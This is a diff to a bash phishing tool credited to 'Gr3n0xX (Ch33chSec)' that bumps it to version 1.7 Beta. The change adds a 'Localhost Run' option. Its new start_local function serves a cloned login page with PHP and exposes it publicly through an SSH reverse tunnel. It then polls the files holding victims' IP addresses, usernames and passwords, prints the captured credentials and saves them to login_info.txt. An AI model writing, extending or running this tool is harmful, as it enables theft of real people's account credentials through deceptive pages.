@@ -79,7 +79,7 @@ echo -e "$R ╔╝$W█$R╚══╦═╦══╦╩═╦═╦═╩╝"
 echo -e "$R╔╝$W█████$R║$W█$R║$W██$R║$W██$R║$W█$R║"
 echo -e "$R║$W██████$R║$W█████████$R║\033[00m"
 echo
-printf "      \e[1;97m  .:.  Version 1.6 Beta  .:.   \e[0m\n"
+printf "      \e[1;97m  .:.  Version 1.7 Beta  .:.   \e[0m\n"
 printf "\n"
 printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX (Ch33chSec)\e[0m\n"
 printf "\n"
@@ -395,7 +395,7 @@ echo -e "$blue
              \n"
 echo
 echo
-printf "      \e[1;97m  .:.  Version 1.6 Beta  .:.  \e[0m\n"
+printf "      \e[1;97m  .:.  Version 1.7 Beta  .:.  \e[0m\n"
 printf "\n"
 printf "   \e[92m[\e[37;1m+\e[92m]\e[0m\e[33;1m Tool Created by Gr3n0xX (Ch33chSec)\e[0m\n"
 printf "\n"
@@ -809,6 +809,50 @@ rm -rf iptracker.log
 
 getcredentials
 }
+start_local(){
+def_port="5555"
+printf "\e[0m\n"
+printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select a Port (Default:\e[0m\e[1;96m %s \e[0m\e[1;92m): \e[0m\e[1;96m' $def_port
+read port
+port="${port:-${def_port}}"
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Initializing...\e[0m\e[1;92m(\e[0m\e[1;96mlocalhost:$port\e[0m\e[1;92m)\e[0m\n"
+cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
+sleep 2
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Launching LocalHostRun ..\e[0m\n"
+printf "\n"
+if [[ -e sendlink ]]; then
+rm -rf sendlink
+fi
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Ctrl + C to view Login Info.Press it After the Victim Opened It.\e[0m\n"
+printf "\e[1;93m\n"
+ssh -R 80:localhost:$port ssh.localhost.run 2>&1
+printf "\e[0m\n"
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Login Info..\e[0m\n"
+while [ true ]; do
+if [[ -e "sites/$server/ip.txt" ]]; then
+c_ip
+rm -rf sites/$server/ip.txt
+fi
+sleep 0.75
+if [[ -e "sites/$server/usernames.txt" ]]; then
+account=$(grep -o 'Username:.*' sites/$server/usernames.txt | cut -d " " -f2)
+IFS=$'\n'
+password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
+cat websites/$server/usernames.txt >> websites/$server/login_info.txt
+printf "\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m sites/%s/login_info.txt\e[0m\n" $server
+printf "\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Press Ctrl + C to exit.\e[0m\n"
+rm -rf sites/$server/usernames.txt
+fi
+sleep 0.75
+done
+}
 
 ##
 serverx() {
@@ -927,6 +971,7 @@ fi
 printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Localhost Run\e[0m\n"
 default_option_server="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m\en' option_server
 option_server="${option_server:-${default_option_server}}"
@@ -935,6 +980,8 @@ startx
 
 elif [[ $option_server == 2 || $option_server == 02 ]]; then
 start
+elif [[ $option_server == 3 || $option_server == 03 ]]; then
+start_local
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
 sleep 1
